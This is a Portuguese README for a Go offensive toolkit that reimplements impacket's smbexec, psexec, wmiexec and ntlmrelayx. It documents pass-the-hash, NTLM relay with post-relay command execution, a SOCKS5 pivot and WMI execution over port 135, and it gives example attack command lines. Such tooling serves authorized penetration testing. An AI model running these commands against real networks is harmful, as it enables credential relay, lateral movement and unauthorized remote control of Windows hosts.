# go-impacket

Reimplementação em Go de quatro ferramentas do [impacket](https://github.com/fortra/impacket) para execução remota e relay de credenciais em ambientes Windows. Nomes, estrutura interna e interfaces foram redesenhados; a lógica de protocolo é equivalente.

## Ferramentas

| Ferramenta Go | Equivalente impacket | Técnica | Autenticação |
|---|---|---|---|
| `scorch` | `smbexec.py` | Cria serviço temporário via SCM (SCMR/DCE-RPC) por comando; output capturado via share SMB | NTLM (pass-the-hash), Kerberos |
| `haunt` | `psexec.py` | Faz upload de binário RemCom como serviço; I/O via named pipes (`RemCom_stdin/stdout/stderr`) | NTLM (pass-the-hash), Kerberos |
| `whisper` | `wmiexec.py` | Executa via DCOM/WMI (`Win32_Process.Create`); não cria serviço, roda como o usuário autenticado | NTLM (pass-the-hash), Kerberos |
| `refract` | `ntlmrelayx.py` | Intercepta autenticações NTLM em listeners SMB/HTTP e as relaya para targets; proxy SOCKS5 e execução pós-relay | — (relay, não autentica diretamente) |

## Build

```bash
git clone https://github.com/w41l3r/go-impacket
cd go-impacket
make all          # compila bin/{scorch,haunt,whisper,refract}
go test ./...     # 25 testes
```

Requer Go 1.22+. Os binários são estáticos (sem dependências de runtime) e rodam em qualquer Linux x86-64 — incluindo dentro de containers ou após `scp` para um relay host.

---

## scorch

Execução remota via Service Control Manager. Para cada comando, cria um serviço temporário cujo `binPath` é o próprio comando, captura o output num arquivo no share e deleta o serviço em seguida.

```
scorch -t [domain/]user[:pass]@host [flags]

  -t        target: [[domain/]user[:pass]@]host
  -H        LMHASH:NTHASH  (pass-the-hash)
  -k        autenticação Kerberos (lê ccache de KRB5CCNAME)
  -dc       IP do domain controller
  -share    share para captura de output (padrão: C$)
  -mode     SHARE ou SERVER — SERVER sobe SMB server local na porta 445 (requer root)
  -shell    cmd ou powershell (padrão: cmd)
  -svc      nome do serviço (aleatório se omitido)
  -timeout  timeout por comando (padrão: 30s)
  -port     porta SMB (padrão: 445)
  -proxy    SOCKS5 proxy — socks5://host:port
  -debug    output verboso
```

> **proxychains e binários estáticos:** Go compila estático por padrão e bypassa o `LD_PRELOAD` do proxychains. Use `-proxy socks5://127.0.0.1:1080` em vez de `proxychains ./scorch`.

**Diferenças vs smbexec.py**
- `-timeout` por comando (original não tem)
- `-proxy` nativo via `golang.org/x/net/proxy` (proxychains não funciona com binários estáticos Go)
- Detecção explícita de output vazio (avisa em vez de silenciar)
- Backoff exponencial na reconexão ao SCM

---

## haunt

Execução interativa via named pipes, estilo psexec. Faz upload de um binário RemCom (fornecido pelo operador) como serviço Windows; as pipes `RemCom_stdin`, `RemCom_stdout` e `RemCom_stderr` são mapeadas para o terminal local em modo raw.

```
haunt -t [domain/]user[:pass]@host -file remcom.exe [flags]

  -t        target
  -H        LMHASH:NTHASH
  -k        Kerberos
  -dc       IP do domain controller
  -file     caminho local do binário RemCom a fazer upload (obrigatório)
  -cmd      comando único a executar (sem -cmd abre shell interativa)
  -path     working directory no target
  -svc      nome do serviço
  -port     porta SMB (padrão: 445)
  -proxy    SOCKS5 proxy — socks5://host:port
  -debug    output verboso
```

O binário RemCom pode ser obtido em https://github.com/kavika13/RemCom.

**Diferenças vs psexec.py**
- Terminal raw mode via `golang.org/x/term` (readline + history no lugar do `cmd.Cmd` do Python)
- Exit code do processo remoto propagado para o processo local quando `-cmd` é usado

---

## whisper

Execução via WMI/DCOM. Não cria serviço — usa `Win32_Process.Create` via interface `IWbemLevel1Login`, o que gera menos eventos no Event Log que `scorch`. Output redirecionado para um arquivo no share e recuperado via SMB.

```
whisper -t [domain/]user[:pass]@host [flags]

  -t            target
  -H            LMHASH:NTHASH
  -k            Kerberos
  -dc           IP do domain controller
  -share        share para captura de output (padrão: ADMIN$)
  -cmd          comando único (sem -cmd abre shell interativa)
  -shell        cmd ou powershell (padrão: cmd)
  -nooutput     não recupera output (imprime o PID retornado)
  -silent       executa sem wrapper cmd.exe (sem output)
  -fallback-scm usa SCM via SMB/445 (padrão: true); false = DCOM nativo via porta 135 (sem SMB)
  -timeout      timeout de espera pelo output (padrão: 30s)
  -port         porta SMB (padrão: 445; ignorada quando -fallback-scm=false)
  -proxy        SOCKS5 proxy — socks5://host:port
  -debug        output verboso
```

**`-fallback-scm=false` — DCOM via porta 135**

Quando SMB/445 está bloqueado (firewall ou segmentação), use `-fallback-scm=false`: whisper resolve o endpoint WMI via EPM (porta 135), faz o handshake NTLM dentro do DCE-RPC e chama `Win32_Process.Create` diretamente, sem abrir nenhuma porta SMB.

```
         EPM:135          dynamic DCOM port
 attacker ──────────────── target
           resolve WMI        NTLM bind → NTLMLogin → ExecMethod
           endpoint           Win32_Process.Create(cmd)
```

A implementação é nativa em Go (MS-RPCE + MS-WMIO + MS-DCOM), sem depender de bibliotecas WMI de Windows. Útil com pivoting:

```bash
# SMB/445 bloqueado, só 135 acessível — via SOCKS5
./whisper -t domain/user:pass@192.168.1.10 -fallback-scm=false -proxy socks5://127.0.0.1:1080
```

**Diferenças vs wmiexec.py**
- `-fallback-scm=false` conecta via DCOM/135 sem precisar de SMB (wmiexec.py sempre requer 445)
- Encoder WMIO nativo: `Win32_Process.__PARAMETERS` codificado sem dependências de runtime Windows
- `-nooutput` imprime o PID retornado pelo `Create()` em vez de suprimir silenciosamente
- `-proxy` nativo via `golang.org/x/net/proxy`
- `-timeout` configurável para espera do output file

---

## refract

Relay de autenticações NTLM. Escuta em listeners SMB (porta 445) e/ou HTTP (porta 80), intercepta o handshake NTLM (Negotiate → Challenge → Authenticate) e relaya para os targets configurados.

```
refract [flags]

  -t          target único (smb://host ou host)
  -tf         arquivo de targets (um por linha)
  -w          monitora o arquivo de targets por mudanças
  -smb-port   porta do listener SMB (padrão: 445)
  -http-port  porta do listener HTTP (padrão: 80)
  -no-smb     desativa listener SMB
  -no-http    desativa listener HTTP
  -c          comando a executar após relay bem-sucedido (via SCM no target)
  -socks      ativa proxy SOCKS5 + shell interativa
  -socks-addr endereço do SOCKS5 (padrão: 127.0.0.1)
  -socks-port porta do SOCKS5 (padrão: 1080)
  -no-multi   relaya cada target apenas uma vez
  -ra         seleção aleatória de targets
  -6          escuta em IPv6
  -timeout    timeout de sessão relay (padrão: 30s)
  -debug      output verboso
```

### Relay SMB → SMB

Máquina de estados SMB2 completa:

```
victim ──NEGOTIATE──► refract ──NEGOTIATE──► target
       ◄─NEGOTIATE_RSP─       ◄─NEGOTIATE_RSP─
       ──SETUP(type1)─►       ──SETUP(type1)─►
       ◄─SETUP(type2)──       ◄─SETUP(type2)──   ← challenge extraído
       ──SETUP(type3)─►       ──SETUP(type3)─►   ← credenciais capturadas
       ◄─SETUP_OK──────       ◄─SETUP_OK──────
                 <proxy bidirecional>
```

SessionIDs são reescritos em cada pacote. SPNEGO unwrap/wrap automático.

### Relay HTTP → SMB

Challenge real extraído do target SMB, tracking por cookie (`rsid`). Sessões pendentes (type-1 sem type-3) expiram em 2 minutos, evitando vazamento de file descriptors.

### `-c` — Execução pós-relay

Após um relay SMB bem-sucedido, executa o comando diretamente na sessão autenticada via SCM — sem nova conexão ou reautenticação. Usa um cliente SMB2 raw sobre o `net.Conn` já autenticado:

```bash
# Captura hash + executa whoami em todos os targets do arquivo
refract -tf targets.txt -c "whoami > C:\\Users\\Public\\out.txt"
```

### `-socks` — Proxy SOCKS5

Inicia um servidor SOCKS5 (RFC 1928, sem autenticação) em `socks-addr:socks-port`. Permite rotear qualquer ferramenta pelos caminhos de rede alcançados via relay:

```bash
# Terminal 1: inicia relay + SOCKS5
refract -t smb://10.0.0.5 -socks -socks-port 1080

# Terminal 2: usa a sessão relay para executar comandos
./scorch  -t domain/user@10.0.0.10 -H :31d6cfe0... -proxy socks5://127.0.0.1:1080
./whisper -t domain/user@10.0.0.10 -H :31d6cfe0... -proxy socks5://127.0.0.1:1080
./haunt   -t domain/user@10.0.0.10 -H :31d6cfe0... -file remcom.exe -proxy socks5://127.0.0.1:1080
```

Quando `-socks` está ativo, abre um prompt `refract>` com os comandos:
- `sessions` — lista sessões autenticadas no vault (IP, domínio, usuário, admin status)
- `targets`  — lista targets configurados
- `exit`     — encerra

**Diferenças vs ntlmrelayx.py**
- Sessões pendentes (type-1 sem type-3) fechadas automaticamente após TTL (original vaza fds)
- TreeId=0 em NEGOTIATE e SESSION_SETUP conforme MS-SMB2
- Session tracking HTTP via cookie em vez de header não-echado por clientes reais
- `-c` executa via cliente SMB2 raw na sessão relay (sem dependência de Impacket ou go-smb no path)
- Proxy SOCKS5 integrado compatível com `-proxy` nativo das outras ferramentas

---

## Autenticação

Todos os comandos aceitam:

| Forma | Exemplo |
|---|---|
| Usuário e senha | `-t domain/user:pass@host` |
| Pass-the-hash | `-t domain/user@host -H aad3b435...:31d6cfe0...` |
| Null session | `-t host` (sem usuário) |
| Kerberos | `-k -dc <dc-ip> -t domain/user@host` |

---

## Arquitetura interna

```
go-impacket/
├── cmd/
│   ├── scorch/      # CLI do scorch
│   ├── haunt/       # CLI do haunt
│   ├── whisper/     # CLI do whisper
│   └── refract/     # CLI do refract
├── internal/
│   ├── cred/        # parsing de credenciais e pass-the-hash
│   ├── dcerpc/      # binding SCMR via go-smb (usado por scorch e haunt)
│   ├── pipes/       # I/O sobre named pipes SMB
│   ├── relay/
│   │   ├── server.go    # broker SMB+HTTP, máquinas de estado relay
│   │   ├── ntlm.go      # vault de sessões, parsing NTLM type3
│   │   ├── targets.go   # pool de targets, file watching
│   │   ├── socks5.go    # servidor SOCKS5 RFC 1928
│   │   └── postcmd.go   # cliente SMB2 raw + SCMR para -c
│   ├── shell/       # REPL semi-interativo (usado por whisper e scorch)
│   ├── transport/   # dial SMB com suporte a proxy
│   └── wmi/
│       ├── dcom.go  # EPM→DCOM→NTLM bind→NTLMLogin→ExecMethod
│       └── wmio.go  # encoder MS-WMIO para Win32_Process.__PARAMETERS
└── pkg/
    └── randname/    # geração de nomes aleatórios
```

Dependências externas: [`jfjallid/go-smb`](https://github.com/jfjallid/go-smb) (SMB2/NTLM/Kerberos), `golang.org/x/net/proxy` (SOCKS5 dial), `golang.org/x/term` (terminal raw mode).

---

## Aviso

Ferramentas destinadas a testes de penetração autorizados, CTFs e pesquisa de segurança ofensiva. Use apenas em sistemas para os quais você tem permissão explícita.
